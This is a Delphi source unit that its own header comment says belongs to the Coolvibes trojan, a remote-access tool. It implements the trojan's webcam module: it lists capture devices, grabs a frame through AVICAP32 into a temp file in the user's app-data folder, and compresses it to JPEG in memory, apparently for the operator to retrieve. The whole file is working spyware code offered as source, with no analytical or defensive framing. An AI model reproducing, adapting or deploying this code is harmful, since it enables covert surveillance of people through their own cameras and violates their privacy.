{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
que son usadas en la captura de pantalla}
unit unitCamScreen;

interface

uses
  Windows,
  Messages,
  unitCapScreen,
  UnitFunciones,
  classes,
  jpeg,
  Graphics,
  SHfolder, //Para sacar el appdir
  SysUtils;


function CapturarWebcam(var MS:Tmemorystream;NumeroDeWebcam: integer; quality:integer): boolean;
procedure DesactivarWebcams();
const
  WM_CAP_START = $0400;
  WM_CAP_DRIVER_CONNECT = $0400 + 10;
  WM_CAP_DRIVER_DISCONNECT = $0400 + 11;
  WM_CAP_SAVEDIB = $0400 + 25;
  WM_CAP_GRAB_FRAME = $0400 + 60;
  WM_CAP_STOP = $0400 + 68;

var
  CaptureWindow: dword;

function capCreateCaptureWindowA(lpszWindowName: PChar; dwStyle: dword;
  x, y, nWidth, nHeight: word; ParentWin: dword; nId: word): dword;
  stdcall; external 'AVICAP32.DLL';
function capGetDriverDescriptionA(wDriverIndex: UINT; lpszName: LPSTR;
  cbName: integer; lpszVer: LPSTR; cbVer: integer): BOOL; stdcall;
  external 'AVICAP32.DLL';

function ListarDispositivos(): string;
//function CapturarWebcam(NivelCompresion, NumeroDeWebcam: Integer): Boolean;

implementation

function ListarDispositivos(): string;
var
  szName, szVersion: array[0..MAX_PATH] of char;
  iReturn: boolean;
  x: integer;
begin
  x := 0;
  repeat
    iReturn := capGetDriverDescriptionA(x, @szName, sizeof(szName),
      @szVersion, sizeof(szVersion));
    if iReturn then
    begin
      Result := Result + szName + ' - ' + szVersion + '|';
      Inc(x);
    end;
  until iReturn = False;
end;


function CapturarWebcam(var MS:Tmemorystream;NumeroDeWebcam: integer; quality:integer): boolean;
var
  bit:  TBitmap;
  hDLL: THandle;
  buf:  array [0..144] of char;
  jpg :TJPegImage;
  Bitmap:TBitmap;
begin
  Result := False;

if CaptureWindow = 0 then
begin
  CaptureWindow := capCreateCaptureWindowA('CaptureWindow', WS_CHILD and WS_VISIBLE, 0, 0, 0, 0, GetDesktopWindow, 0);
  if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, NumeroDeWebcam, 0) <> 1 then
  begin
    SendMessage(CaptureWindow, WM_CLOSE, 0, 0);
    SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    CaptureWindow := 0;
  end;
end;

  if CaptureWindow <> 0 then
  begin
//    if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, NumeroDeWebcam, 0) <> 0 then
//    begin
      SendMessage(CaptureWindow, WM_CAP_GRAB_FRAME, 0, 0);
      SendMessage(CaptureWindow, WM_CAP_SAVEDIB, 0, longint(PChar(GetSpecialFolderPath(CSIDL_LOCAL_APPDATA) + '~~tmp.tmp')));
//      SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
//      CaptureWindow := 0;


          Result := true;


//    end
//    else
//      Result := False;




    //comprimimos tmp.tmp...
    bit := TBitmap.Create();
    bit.LoadFromFile(GetSpecialFolderPath(CSIDL_LOCAL_APPDATA) + '~~tmp.tmp');
  if bit <> nil then
  begin
    Jpg := TjpegImage.Create;
    Jpg.Assign(bit);
    Jpg.CompressionQuality := quality;
    Jpg.Compress;
    Jpg.SaveToStream(MS);  //guardamos el jpg en el memorystream
    Jpg.Free;
    bit.Free;
    Result:=True;
  end
  else
    Result:=False;

  end
  else
    Result := False;
end;

procedure DesactivarWebcams();
begin
  if CaptureWindow <> 0 then
  begin
    SendMessage(CaptureWindow, WM_CLOSE, 0, 0);
    SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    CaptureWindow := 0;
  end;
end;


end.
